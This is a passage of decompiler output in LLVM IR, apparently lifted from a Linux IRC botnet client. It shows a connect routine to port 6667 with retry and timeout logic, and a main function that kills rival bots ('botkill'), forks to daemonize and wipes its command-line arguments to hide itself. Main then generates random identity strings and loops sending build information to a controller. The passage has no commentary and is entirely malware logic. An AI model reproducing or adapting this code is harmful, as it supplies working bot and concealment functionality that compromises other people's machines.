  store i32 6667, i32* %v2_8054f85, align 4
  %v0_8054f8a = load i32, i32* %stack_var_-32, align 4
  %v1_8054f8a = call i32 @htons(i32 %v0_8054f8a)
  %v0_8054f8f = load i32, i32* @esp, align 4
  %v0_8054f96 = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_8054f96, i32* %edx.global-to-local, align 4
  store i32 %v2_8054f9f, i32* %eax.global-to-local, align 4
  %v2_8054fa2 = add i32 %v0_8054f8f, 8
  %v3_8054fa2 = inttoptr i32 %v2_8054fa2 to i32*
  store i32 %v2_8054f9f, i32* %v3_8054fa2, align 4
  %v1_8054fa3 = add i32 %v0_8054f8f, 4
  %v2_8054fa3 = inttoptr i32 %v1_8054fa3 to i32*
  store i32 21537, i32* %v2_8054fa3, align 4
  %v0_8054fa8 = load i32, i32* %edx.global-to-local, align 4
  %v3_8054fa8 = inttoptr i32 %v0_8054f8f to i32*
  store i32 %v0_8054fa8, i32* %v3_8054fa8, align 4
  %sext = mul i32 %v1_8054f8a, 65536
  %v1_8054fa9 = sdiv i32 %sext, 65536
  %v4_8054fa9 = call i32 @ioctl(i32 %v1_8054fa9, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8054fa9, i32* %eax.global-to-local, align 4
  %v0_8054fae = load i32, i32* @esp, align 4
  %v2_8054fb4 = inttoptr i32 %v0_8054fae to i32*
  store i32 0, i32* %v2_8054fb4, align 4
  %v2_8054fb6 = inttoptr i32 %v1_8054fa9 to i32*
  %v3_8054fb6 = call i32 @__GI_time(i32* %v2_8054fb6)
  store i32 %v3_8054fb6, i32* %eax.global-to-local, align 4
  %v1_8055070 = inttoptr i32 %v3_8054fb6 to i32*
  br label %dec_label_pc_805506b

dec_label_pc_8054fc6:                             ; preds = %dec_label_pc_805506b
  %v1_8054fc6 = call i32 @__errno_location(i32 %v3_8054fb6)
  %v1_8054fcb = inttoptr i32 %v1_8054fc6 to i32*
  store i32 0, i32* %v1_8054fcb, align 4
  store i32 %v2_8054f4a, i32* %eax.global-to-local, align 4
  %v0_8054fd4 = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_8054fd4, i32* %edx.global-to-local, align 4
  %v0_8054fda = load i32, i32* @esp, align 4
  %v1_8054fdd = add i32 %v0_8054fda, -8
  %v2_8054fdd = inttoptr i32 %v1_8054fdd to i32*
  store i32 16, i32* %v2_8054fdd, align 4
  %v2_8054fdf = add i32 %v0_8054fda, -12
  %v3_8054fdf = inttoptr i32 %v2_8054fdf to i32*
  store i32 %v2_8054f4a, i32* %v3_8054fdf, align 4
  %v0_8054fe0 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054fe0 = add i32 %v0_8054fda, -16
  %v3_8054fe0 = inttoptr i32 %v2_8054fe0 to i32*
  store i32 %v0_8054fe0, i32* %v3_8054fe0, align 4
  %v2_8054fe1 = load i32, i32* %stack_var_-4, align 4
  %v3_8054fe1 = call i32 @connect(i32 %v3_8054fb6, i32 %stack_var_-8.1, i32 %v2_8054fe1)
  store i32 %v3_8054fe1, i32* %eax.global-to-local, align 4
  %v0_8054fe6 = load i32, i32* @esp, align 4
  %v1_8054fe6 = add i32 %v0_8054fe6, 16
  %v1_8054fe9 = icmp eq i32 %v3_8054fe1, 0
  br i1 %v1_8054fe9, label %dec_label_pc_8054ff9, label %dec_label_pc_8054fed

dec_label_pc_8054fed:                             ; preds = %dec_label_pc_8054fc6
  %v1_8054fed = call i32 @__errno_location(i32 %v3_8054fb6)
  store i32 %v1_8054fed, i32* %eax.global-to-local, align 4
  %v1_8054ff2 = inttoptr i32 %v1_8054fed to i32*
  %v2_8054ff2 = load i32, i32* %v1_8054ff2, align 4
  store i32 %v2_8054ff2, i32* %eax.global-to-local, align 4
  %v9_8054ff4 = icmp eq i32 %v2_8054ff2, 106
  %v1_8054ff7 = icmp eq i1 %v9_8054ff4, false
  br i1 %v1_8054ff7, label %dec_label_pc_8055046, label %dec_label_pc_8054fed.dec_label_pc_8054ff9_crit_edge

dec_label_pc_8054fed.dec_label_pc_8054ff9_crit_edge: ; preds = %dec_label_pc_8054fed
  %v0_8054ffe.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054ff9

dec_label_pc_8054ff9:                             ; preds = %dec_label_pc_8054fc6, %dec_label_pc_8054fed.dec_label_pc_8054ff9_crit_edge
  %v0_8054ffe = phi i32 [ %v0_8054ffe.pre, %dec_label_pc_8054fed.dec_label_pc_8054ff9_crit_edge ], [ %v1_8054fe6, %dec_label_pc_8054fc6 ]
  %v0_8054ff9 = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_8054ff9, i32* %eax.global-to-local, align 4
  %v1_8055001 = add i32 %v0_8054ffe, -16
  %v2_8055001 = inttoptr i32 %v1_8055001 to i32*
  store i32 0, i32* %v2_8055001, align 4
  %v1_8055003 = add i32 %v0_8054ffe, -20
  %v2_8055003 = inttoptr i32 %v1_8055003 to i32*
  store i32 0, i32* %v2_8055003, align 4
  %v1_8055005 = add i32 %v0_8054ffe, -24
  %v2_8055005 = inttoptr i32 %v1_8055005 to i32*
  store i32 13, i32* %v2_8055005, align 4
  %v1_8055007 = add i32 %v0_8054ffe, -28
  %v2_8055007 = inttoptr i32 %v1_8055007 to i32*
  store i32 1, i32* %v2_8055007, align 4
  %v0_8055009 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055009 = add i32 %v0_8054ffe, -32
  %v3_8055009 = inttoptr i32 %v2_8055009 to i32*
  store i32 %v0_8055009, i32* %v3_8055009, align 4
  %v2_805500a = load i32, i32* %stack_var_-4, align 4
  %v3_805500a = load i32, i32* %stack_var_0, align 4
  %v5_805500a = call i32 @__GI_setsockopt(i32 %v3_8054fb6, i32 %stack_var_-8.1, i32 %v2_805500a, i32 %v3_805500a, i32 ptrtoint (i32* @0 to i32))
  %v0_805500f = load i32, i32* @esp, align 4
  %v0_8055012 = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_8055012, i32* %eax.global-to-local, align 4
  %v1_805501a = add i32 %v0_805500f, 16
  %v2_805501a = inttoptr i32 %v1_805501a to i32*
  store i32 0, i32* %v2_805501a, align 4
  %v1_805501c = add i32 %v0_805500f, 12
  %v2_805501c = inttoptr i32 %v1_805501c to i32*
  store i32 0, i32* %v2_805501c, align 4
  %v1_805501e = add i32 %v0_805500f, 8
  %v2_805501e = inttoptr i32 %v1_805501e to i32*
  store i32 2, i32* %v2_805501e, align 4
  %v1_8055020 = add i32 %v0_805500f, 4
  %v2_8055020 = inttoptr i32 %v1_8055020 to i32*
  store i32 1, i32* %v2_8055020, align 4
  %v0_8055022 = load i32, i32* %eax.global-to-local, align 4
  %v3_8055022 = inttoptr i32 %v0_805500f to i32*
  store i32 %v0_8055022, i32* %v3_8055022, align 4
  %v2_8055023 = load i32, i32* %stack_var_-4, align 4
  %v3_8055023 = load i32, i32* %stack_var_0, align 4
  %v5_8055023 = call i32 @__GI_setsockopt(i32 %v3_8054fb6, i32 %stack_var_-8.1, i32 %v2_8055023, i32 %v3_8055023, i32 ptrtoint (i32* @0 to i32))
  %v0_8055028 = load i32, i32* @esp, align 4
  %v0_805502b = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_805502b, i32* %eax.global-to-local, align 4
  %v1_8055033 = add i32 %v0_8055028, 16
  %v2_8055033 = inttoptr i32 %v1_8055033 to i32*
  store i32 0, i32* %v2_8055033, align 4
  %v1_8055035 = add i32 %v0_8055028, 12
  %v2_8055035 = inttoptr i32 %v1_8055035 to i32*
  store i32 0, i32* %v2_8055035, align 4
  %v1_8055037 = add i32 %v0_8055028, 8
  %v2_8055037 = inttoptr i32 %v1_8055037 to i32*
  store i32 9, i32* %v2_8055037, align 4
  %v1_8055039 = add i32 %v0_8055028, 4
  %v2_8055039 = inttoptr i32 %v1_8055039 to i32*
  store i32 1, i32* %v2_8055039, align 4
  %v0_805503b = load i32, i32* %eax.global-to-local, align 4
  %v3_805503b = inttoptr i32 %v0_8055028 to i32*
  store i32 %v0_805503b, i32* %v3_805503b, align 4
  %v2_805503c = load i32, i32* %stack_var_-4, align 4
  %v3_805503c = load i32, i32* %stack_var_0, align 4
  %v5_805503c = call i32 @__GI_setsockopt(i32 %v3_8054fb6, i32 %stack_var_-8.1, i32 %v2_805503c, i32 %v3_805503c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805503c, i32* %eax.global-to-local, align 4
  %v2_80550a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80550a4, i32* @ebp, align 4
  ret i32 %v5_805503c

dec_label_pc_8055046:                             ; preds = %dec_label_pc_8054fed
  %v1_8055046 = call i32 @__errno_location(i32 %v3_8054fb6)
  store i32 %v1_8055046, i32* %eax.global-to-local, align 4
  %v1_805504b = inttoptr i32 %v1_8055046 to i32*
  %v2_805504b = load i32, i32* %v1_805504b, align 4
  store i32 %v2_805504b, i32* %eax.global-to-local, align 4
  %v9_805504d = icmp eq i32 %v2_805504b, 115
  br i1 %v9_805504d, label %dec_label_pc_805505e, label %dec_label_pc_8055052

dec_label_pc_8055052:                             ; preds = %dec_label_pc_8055046
  %v1_8055052 = call i32 @__errno_location(i32 %v3_8054fb6)
  store i32 %v1_8055052, i32* %eax.global-to-local, align 4
  %v1_8055057 = inttoptr i32 %v1_8055052 to i32*
  %v2_8055057 = load i32, i32* %v1_8055057, align 4
  store i32 %v2_8055057, i32* %eax.global-to-local, align 4
  %v9_8055059 = icmp eq i32 %v2_8055057, 114
  %v1_805505c = icmp eq i1 %v9_8055059, false
  br i1 %v1_805505c, label %dec_label_pc_8055052.dec_label_pc_8055084_crit_edge, label %dec_label_pc_805505e

dec_label_pc_8055052.dec_label_pc_8055084_crit_edge: ; preds = %dec_label_pc_8055052
  %v0_8055093.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055084

dec_label_pc_805505e:                             ; preds = %dec_label_pc_8055052, %dec_label_pc_8055046
  %v0_805505e = load i32, i32* @esp, align 4
  %v1_8055061 = add i32 %v0_805505e, -16
  %v2_8055061 = inttoptr i32 %v1_8055061 to i32*
  store i32 1, i32* %v2_8055061, align 4
  %v1_8055063 = call i32 @sleep(i32 %v3_8054fb6)
  store i32 %v1_8055063, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805506b

dec_label_pc_805506b:                             ; preds = %dec_label_pc_8054f7c, %dec_label_pc_805505e
  %storemerge4.in.in = load i32, i32* @esp, align 4
  %v2_805506e = inttoptr i32 %storemerge4.in.in to i32*
  store i32 0, i32* %v2_805506e, align 4
  %v2_8055070 = call i32 @__GI_time(i32* %v1_8055070)
  %v0_8055075 = load i32, i32* @esp, align 4
  %v1_8055075 = add i32 %v0_8055075, 16
  %v5_8055078 = sub i32 %v2_8055070, %v3_8054fb6
  store i32 %v5_8055078, i32* %eax.global-to-local, align 4
  %tmp45 = icmp ult i32 %v5_8055078, 10
  br i1 %tmp45, label %dec_label_pc_8054fc6, label %dec_label_pc_8055084

dec_label_pc_8055084:                             ; preds = %dec_label_pc_805506b, %dec_label_pc_8055052.dec_label_pc_8055084_crit_edge
  %v0_8055093 = phi i32 [ %v0_8055093.pre, %dec_label_pc_8055052.dec_label_pc_8055084_crit_edge ], [ %v1_8055075, %dec_label_pc_805506b ]
  store i32 0, i32* @global_var_807cc84.530, align 4
  %v0_805508e = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_805508e, i32* %eax.global-to-local, align 4
  %v2_8055096 = add i32 %v0_8055093, -16
  %v3_8055096 = inttoptr i32 %v2_8055096 to i32*
  store i32 %v0_805508e, i32* %v3_8055096, align 4
  %v1_8055097 = call i32 @close(i32 %v3_8054fb6)
  br label %dec_label_pc_8054e77.backedge

; uselistorder directives
  uselistorder i32 %v0_8054ffe, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_8054fb6, { 3, 10, 5, 4, 6, 0, 1, 2, 7, 8, 9, 11, 12 }
  uselistorder i32 %v1_8054fa9, { 1, 0 }
  uselistorder i32 %stack_var_-8.1, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_8054f16, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8054f11, { 2, 3, 5, 4, 7, 6, 0, 1, 8, 9 }
  uselistorder i32 %v0_8054f00, { 1, 0 }
  uselistorder i32 %v3_8054ec7, { 2, 1, 0 }
  uselistorder i32 %v0_8054ebe, { 2, 1, 0 }
  uselistorder i32 %v2_8054f4a, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 5, 2, 1, 0, 4, 3, 7, 6 }
  uselistorder i32* %stack_var_-32, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %stack_var_0, { 2, 1, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 18, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40 }
  uselistorder i32 (i32)* @sleep, { 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @connect, { 7, 6, 5, 8, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @htons, { 58, 57, 56, 59, 2, 55, 54, 53, 52, 51, 40, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805506b, { 1, 0 }
  uselistorder label %dec_label_pc_8054ff9, { 1, 0 }
  uselistorder label %dec_label_pc_8054f7c, { 1, 0 }
  uselistorder label %dec_label_pc_8054e77.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8054eb4, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp75 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-32 = alloca i8*, align 4
  %tmp78 = call i32 @__decompiler_undefined_function_0()
  %tmp84 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1484 = alloca i32, align 4
  %stack_var_-2508 = alloca i32, align 4
  %stack_var_-6604 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-6656 = alloca i8*, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_80550a6 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_80550a6, i32* @ecx, align 4
  store i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_806c6ec.634, i32 0, i32 0), i8** %stack_var_-6656, align 4
  %v2_80550cb = call i32 @puts(i32 ptrtoint ([73 x i8]* @global_var_806c6ec.634 to i32))
  store i32 %v2_80550cb, i32* %eax.global-to-local, align 4
  store i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_806c738.635, i32 0, i32 0), i8** %stack_var_-6656, align 4
  %v2_80550db = call i32 @puts(i32 ptrtoint ([68 x i8]* @global_var_806c738.635 to i32))
  store i32 %v2_80550db, i32* %eax.global-to-local, align 4
  store i8* getelementptr inbounds ([130 x i8], [130 x i8]* @global_var_806c77c.636, i32 0, i32 0), i8** %stack_var_-6656, align 4
  %v2_80550eb = call i32 @puts(i32 ptrtoint ([130 x i8]* @global_var_806c77c.636 to i32))
  store i32 %v2_80550eb, i32* %eax.global-to-local, align 4
  %v0_80550f3 = call i32 @botkill()
  store i32 %v0_80550f3, i32* %eax.global-to-local, align 4
  store i32 1701603661, i32* @global_var_807ca60.63, align 32
  store i32 1232038766, i32* @global_var_807ca64.637, align 4
  store i32 1970231667, i32* @global_var_807ca68.638, align 8
  store i32 1685014386, i32* @global_var_807ca6c.639, align 4
  store i32 2171169, i32* @global_var_807ca70.640, align 16
  %v0_805512a = load i8*, i8** %stack_var_-6656, align 4
  %v1_805512a = ptrtoint i8* %v0_805512a to i32
  %v2_805512a = call i32 @fork(i32 %v1_805512a)
  store i32 %v2_805512a, i32* %eax.global-to-local, align 4
  %v1_805512f = icmp eq i32 %v2_805512a, 0
  br i1 %v1_805512f, label %dec_label_pc_805513d, label %dec_label_pc_8055133

dec_label_pc_8055133:                             ; preds = %entry
  store i8* null, i8** %stack_var_-6656, align 4
  %v2_8055138 = call i32 @__GI_exit(i32 0)
  store i32 %v2_8055138, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805513d

dec_label_pc_805513d:                             ; preds = %entry, %dec_label_pc_8055133
  store i32 %v2_80550a6, i32* %edx.global-to-local, align 4
  %v1_8055143 = add i32 %v2_80550a6, 4
  %v2_8055143 = inttoptr i32 %v1_8055143 to i32*
  %v3_8055143 = load i32, i32* %v2_8055143, align 4
  store i32 %v3_8055143, i32* %eax.global-to-local, align 4
  %v1_8055146 = inttoptr i32 %v3_8055143 to i32*
  %v2_8055146 = load i32, i32* %v1_8055146, align 4
  %v1_8055153 = and i32 %v2_8055146, -256
  store i32 %v1_8055153, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8055156 = inttoptr i32 %v2_8055146 to i8*
  %v3_805515c = call i32 @_strlen(i8* %v4_8055156)
  %v4_805515c = mul i32 %v3_805515c, -1
  %v1_8055160 = sub i32 1, %v4_805515c
  store i32 %v1_8055160, i32* %eax.global-to-local, align 4
  %v1_8055162 = sub i32 0, %v4_805515c
  store i32 %v1_8055162, i32* %edx.global-to-local, align 4
  %v3_805516b = load i32, i32* %v2_8055143, align 4
  store i32 %v3_805516b, i32* %eax.global-to-local, align 4
  %v1_805516e = inttoptr i32 %v3_805516b to i32*
  %v2_805516e = load i32, i32* %v1_805516e, align 4
  store i32 %v2_805516e, i32* %eax.global-to-local, align 4
  %v5_8055179 = inttoptr i32 %v2_805516e to i8*
  store i8* %v5_8055179, i8** %stack_var_-6656, align 4
  %v6_805517a = call i32 @strncpy(i8* %v5_8055179, i32 ptrtoint ([3 x i8]* @global_var_806c7fe.641 to i32), i32 %v1_8055162)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v2_80550a6, i32* @edi, align 4
  %v3_80551e5164 = load i32, i32* %stack_var_4, align 4
  %v5_80551e7172 = icmp sgt i32 %v3_80551e5164, 1
  br i1 %v5_80551e7172, label %dec_label_pc_805518b, label %dec_label_pc_80551e9

dec_label_pc_805518b:                             ; preds = %dec_label_pc_805513d, %dec_label_pc_805518b
  %storemerge12173 = phi i32 [ %v4_80551d9, %dec_label_pc_805518b ], [ 1, %dec_label_pc_805513d ]
  %v2_805518e = mul i32 %storemerge12173, 4
  store i32 %v2_805518e, i32* %eax.global-to-local, align 4
  %v4_8055197 = load i32, i32* %v2_8055143, align 4
  %v5_8055197 = add i32 %v4_8055197, %v2_805518e
  store i32 %v5_8055197, i32* %eax.global-to-local, align 4
  %v1_805519a = inttoptr i32 %v5_8055197 to i32*
  %v2_805519a = load i32, i32* %v1_805519a, align 4
  %v1_80551a7 = and i32 %v2_805519a, -256
  store i32 %v1_80551a7, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_80551aa = inttoptr i32 %v2_805519a to i8*
  store i32 %v2_805519a, i32* @edi, align 4
  %v3_80551b0 = call i32 @_strlen(i8* %v4_80551aa)
  store i32 %v3_80551b0, i32* %edx.global-to-local, align 4
  store i32 %v2_805518e, i32* %eax.global-to-local, align 4
  %v4_80551c5 = load i32, i32* %v2_8055143, align 4
  %v5_80551c5 = add i32 %v4_80551c5, %v2_805518e
  store i32 %v5_80551c5, i32* %eax.global-to-local, align 4
  %v1_80551c8 = inttoptr i32 %v5_80551c5 to i32*
  %v2_80551c8 = load i32, i32* %v1_80551c8, align 4
  store i32 %v2_80551c8, i32* %eax.global-to-local, align 4
  %v5_80551d0 = inttoptr i32 %v2_80551c8 to i8*
  store i8* %v5_80551d0, i8** %stack_var_-6656, align 4
  %v6_80551d1 = call i32 @__GI_memset(i8* %v5_80551d0, i32 0, i32 %v3_80551b0)
  %v4_80551d9 = add i32 %storemerge12173, 1
  store i32 %v4_80551d9, i32* %eax.global-to-local, align 4
  store i32 %v2_80550a6, i32* @edi, align 4
  %v3_80551e5 = load i32, i32* %stack_var_4, align 4
  %v5_80551e7 = icmp slt i32 %v4_80551d9, %v3_80551e5
  br i1 %v5_80551e7, label %dec_label_pc_805518b, label %dec_label_pc_80551e9

dec_label_pc_80551e9:                             ; preds = %dec_label_pc_805518b, %dec_label_pc_805513d
  %stack_var_-6628.0.lcssa = phi i32 [ %tmp84, %dec_label_pc_805513d ], [ %v2_805519a, %dec_label_pc_805518b ]
  store i8* null, i8** %stack_var_-6656, align 4
  %v3_80551ee = call i32 @__GI_time(i32* null)
  store i32 %v3_80551ee, i32* %eax.global-to-local, align 4
  store i32 %v3_80551ee, i32* @ebx, align 4
  %v2_80551f8 = call i32 @__libc_getpid(i32 0)
  store i32 %v2_80551f8, i32* %eax.global-to-local, align 4
  %v0_80551fd = load i32, i32* @ebx, align 4
  %v2_80551fd = xor i32 %v0_80551fd, %v2_80551f8
  store i32 %v2_80551fd, i32* @ebx, align 4
  %v0_80551ff = load i8*, i8** %stack_var_-6656, align 4
  %v1_80551ff = ptrtoint i8* %v0_80551ff to i32
  %v2_80551ff = call i32 @getppid(i32 %v1_80551ff)
  %v0_8055204 = load i32, i32* @ebx, align 4
  %v2_8055204 = add i32 %v0_8055204, %v2_80551ff
  store i32 %v2_8055204, i32* %eax.global-to-local, align 4
  %v5_805520a = inttoptr i32 %v2_8055204 to i8*
  store i8* %v5_805520a, i8** %stack_var_-6656, align 4
  %v2_805520b = call i32 @srand(i32 %v2_8055204)
  store i32 %v2_805520b, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-6656, align 4
  %v4_805521a = call i32 @realrand(i32 4, i32 8)
  store i32 %v4_805521a, i32* %eax.global-to-local, align 4
  %v5_8055225 = inttoptr i32 %v4_805521a to i8*
  store i8* %v5_8055225, i8** %stack_var_-6656, align 4
  %v3_8055226 = call i32 @randstring(i8* %v5_8055225)
  store i32 %v3_8055226, i32* %eax.global-to-local, align 4
  store i32 %v3_8055226, i32* @global_var_807cb6c.53, align 4
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-6656, align 4
  %v4_805523a = call i32 @realrand(i32 4, i32 8)
  store i32 %v4_805523a, i32* %eax.global-to-local, align 4
  %v5_8055245 = inttoptr i32 %v4_805523a to i8*
  store i8* %v5_8055245, i8** %stack_var_-6656, align 4
  %v3_8055246 = call i32 @randstring(i8* %v5_8055245)
  store i32 %v3_8055246, i32* %eax.global-to-local, align 4
  store i32 %v3_8055246, i32* @global_var_807cb64.36, align 4
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-6656, align 4
  %v4_805525a = call i32 @realrand(i32 4, i32 8)
  store i32 %v4_805525a, i32* %eax.global-to-local, align 4
  %v5_8055265 = inttoptr i32 %v4_805525a to i8*
  store i8* %v5_8055265, i8** %stack_var_-6656, align 4
  %v3_8055266 = call i32 @randstring(i8* %v5_8055265)
  store i32 %v3_8055266, i32* %eax.global-to-local, align 4
  store i32 %v3_8055266, i32* @global_var_807cb7c.642, align 4
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806a22b.283, i32 0, i32 0), i8** @global_var_807e0f8.299, align 8
  store i32 ptrtoint ([8 x i8]* @global_var_806c801.643 to i32), i32* @global_var_807e0dc.623, align 4
  store i32 0, i32* @global_var_807cc84.530, align 4
  %v2_80552db = ptrtoint i32* %stack_var_-460 to i32
  %tmp106 = bitcast i32* %stack_var_-460 to i8*
  %v2_8055323 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8055487 = ptrtoint i32* %stack_var_-6604 to i32
  %v2_8055557 = ptrtoint i32* %stack_var_-2508 to i32
  %v2_80555ae = ptrtoint i32* %stack_var_-1484 to i32
  %tmp107 = bitcast i8** %stack_var_-32 to i32*
  br label %dec_label_pc_8055293

dec_label_pc_8055293:                             ; preds = %dec_label_pc_8055659, %dec_label_pc_805564c, %dec_label_pc_8055674, %dec_label_pc_80552d1, %dec_label_pc_805547b, %dec_label_pc_80551e9
  %stack_var_-6632.0 = phi i8* [ %tmp75, %dec_label_pc_80551e9 ], [ %stack_var_-6632.2.ph, %dec_label_pc_805564c ], [ %stack_var_-6632.2.ph, %dec_label_pc_8055659 ], [ %stack_var_-6632.2.ph, %dec_label_pc_8055674 ], [ %stack_var_-6632.1.ph.ph113, %dec_label_pc_80552d1 ], [ %stack_var_-6632.1.ph.ph113, %dec_label_pc_805547b ]
  %stack_var_-40.0 = phi i32 [ %tmp78, %dec_label_pc_80551e9 ], [ %stack_var_-40.3.lcssa, %dec_label_pc_805564c ], [ %stack_var_-40.3.lcssa, %dec_label_pc_8055659 ], [ %stack_var_-40.3.lcssa, %dec_label_pc_8055674 ], [ %stack_var_-40.1, %dec_label_pc_80552d1 ], [ %stack_var_-40.3.lcssa, %dec_label_pc_805547b ]
  %v0_8055293 = call i32 @con()
  store i32 %v0_8055293, i32* %eax.global-to-local, align 4
  %v0_8055298 = load i32, i32* @global_var_807cb64.36, align 4
  store i32 %v0_8055298, i32* @ebx, align 4
  %v0_805529e = load i32, i32* @global_var_807cb7c.642, align 4
  store i32 %v0_805529e, i32* @esi, align 4
  %v0_80552a4 = load i32, i32* @global_var_807cb6c.53, align 4
  store i32 %v0_80552a4, i32* @edi, align 4
  %v0_80552aa = call i32 @getBuild()
  store i32 %v0_80552aa, i32* %eax.global-to-local, align 4
  %v0_80552af = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_80552af, i32* %edx.global-to-local, align 4
  %v0_80552b5 = load i32, i32* @esp, align 4
  %v0_80552b8 = load i32, i32* @ebx, align 4
  %v2_80552b8 = add i32 %v0_80552b5, -8
  %v3_80552b8 = inttoptr i32 %v2_80552b8 to i32*
  store i32 %v0_80552b8, i32* %v3_80552b8, align 4
  %v0_80552b9 = load i32, i32* @esi, align 4
  %v2_80552b9 = add i32 %v0_80552b5, -12
  %v3_80552b9 = inttoptr i32 %v2_80552b9 to i32*
  store i32 %v0_80552b9, i32* %v3_80552b9, align 4
  %v0_80552ba = load i32, i32* @edi, align 4
  %v2_80552ba = add i32 %v0_80552b5, -16
  %v3_80552ba = inttoptr i32 %v2_80552ba to i32*
  store i32 %v0_80552ba, i32* %v3_80552ba, align 4
  %v2_80552bb = add i32 %v0_80552b5, -20
  %v3_80552bb = inttoptr i32 %v2_80552bb to i32*
  store i32 %v0_80552aa, i32* %v3_80552bb, align 4
  %v1_80552bc = add i32 %v0_80552b5, -24
  %v2_80552bc = inttoptr i32 %v1_80552bc to i32*
  store i32 ptrtoint (i32* @global_var_8068e47.55 to i32), i32* %v2_80552bc, align 4
  %v1_80552c1 = add i32 %v0_80552b5, -28
  %v2_80552c1 = inttoptr i32 %v1_80552c1 to i32*
  store i32 ptrtoint ([48 x i8]* @global_var_806c80c.644 to i32), i32* %v2_80552c1, align 4
  %v0_80552c6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80552c6 = add i32 %v0_80552b5, -32
  %v3_80552c6 = inttoptr i32 %v2_80552c6 to i32*
  store i32 %v0_80552c6, i32* %v3_80552c6, align 4
  %v0_80552c7 = load i8*, i8** %stack_var_-6656, align 4
  %v1_80552c7 = ptrtoint i8* %v0_80552c7 to i32
  %v4_80552c7 = call i32 @Send(i32 %v1_80552c7, i32 8)
  store i32 %v4_80552c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80552d1.outer.outer

dec_label_pc_80552d1.outer.outer:                 ; preds = %dec_label_pc_8055683, %dec_label_pc_80556a2, %dec_label_pc_8055293
  %stack_var_-6632.1.ph.ph113 = phi i8* [ %stack_var_-6632.0, %dec_label_pc_8055293 ], [ %stack_var_-6632.331, %dec_label_pc_80556a2 ], [ %stack_var_-6632.2.ph, %dec_label_pc_8055683 ]
  %stack_var_-40.1.ph.ph = phi i32 [ %stack_var_-40.0, %dec_label_pc_8055293 ], [ %stack_var_-40.3.lcssa, %dec_label_pc_80556a2 ], [ %stack_var_-40.3.lcssa, %dec_label_pc_8055683 ]
  br label %dec_label_pc_80552d1.outer

dec_label_pc_80552d1.outer:                       ; preds = %dec_label_pc_80552d1.outer.outer, %dec_label_pc_80554a4
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.3.lcssa, %dec_label_pc_80554a4 ], [ %stack_var_-40.1.ph.ph, %dec_label_pc_80552d1.outer.outer ]
  br label %dec_label_pc_80552d1

dec_label_pc_80552d1:                             ; preds = %dec_label_pc_80552d1.outer, %dec_label_pc_8055456
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.3.lcssa, %dec_label_pc_8055456 ], [ %stack_var_-40.1.ph, %dec_label_pc_80552d1.outer ]
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_80552db, i32* @edi, align 4
  store i1 false, i1* @df, align 1
